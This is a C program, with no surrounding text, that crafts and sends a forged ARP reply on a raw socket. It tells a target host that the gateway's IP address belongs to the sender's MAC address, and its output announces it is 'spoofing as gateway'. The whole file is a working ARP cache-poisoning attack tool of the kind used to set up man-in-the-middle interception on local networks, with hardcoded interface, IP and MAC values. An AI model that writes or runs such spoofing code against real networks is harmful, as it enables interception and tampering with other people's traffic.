#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>  
#include <net/if.h>           
#include <sys/ioctl.h>         
#define ETH_HDR_LEN 14
#define ARP_PKT_LEN 28

struct eth_hdr {
    unsigned char dest_mac[6];
    unsigned char src_mac[6];
    unsigned short ethertype;
};

struct arp_hdr {
    unsigned short hw_type;   
    unsigned short proto_type;
    unsigned char hw_size;    
    unsigned char proto_size; 
    unsigned short opcode;    
    unsigned char sender_mac[6];
    unsigned char sender_ip[4];
    unsigned char target_mac[6];
    unsigned char target_ip[4];
};

void send_arp_reply(const char *iface, const char *target_ip, const char *gateway_ip, const char *your_mac, const char *target_mac) {
    int sockfd;
    unsigned char buffer[ETH_HDR_LEN + ARP_PKT_LEN];
    struct eth_hdr *eth = (struct eth_hdr *)buffer;
    struct arp_hdr *arp = (struct arp_hdr *)(buffer + ETH_HDR_LEN);
    struct sockaddr_ll socket_address = {0};
    struct ifreq ifr;

    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("IOCTL failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    socket_address.sll_ifindex = ifr.ifr_ifindex;

    memcpy(eth->dest_mac, ether_aton(target_mac), 6); 
    memcpy(eth->src_mac, ether_aton(your_mac), 6);   
    eth->ethertype = htons(0x0806);                  

    arp->hw_type = htons(1);              
    arp->proto_type = htons(0x0800);      
    arp->hw_size = 6;                    
    arp->proto_size = 4;                  
    arp->opcode = htons(2);              
    memcpy(arp->sender_mac, ether_aton(your_mac), 6); 
    inet_pton(AF_INET, gateway_ip, arp->sender_ip);   
    memcpy(arp->target_mac, ether_aton(target_mac), 6); 
    inet_pton(AF_INET, target_ip, arp->target_ip);  

    memcpy(socket_address.sll_addr, ether_aton(target_mac), 6);
    socket_address.sll_halen = ETH_ALEN;

    if (sendto(sockfd, buffer, ETH_HDR_LEN + ARP_PKT_LEN, 0,
               (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
        perror("Failed to send packet");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("ARP reply sent to %s (%s), spoofing as gateway (%s)\n", target_ip, target_mac, gateway_ip);

    close(sockfd);
}

int main() {
    const char *iface = "enp0s3";          
    const char *target_ip = "10.14.3.6";          
    const char *gateway_ip = "10.14.254.254";
    const char *your_mac = "08:01:27:11:27:86";  
    const char *target_mac = "00:be:43:9b:d8:74"; 
    send_arp_reply(iface, target_ip, gateway_ip, your_mac, target_mac);
    return 0;
}
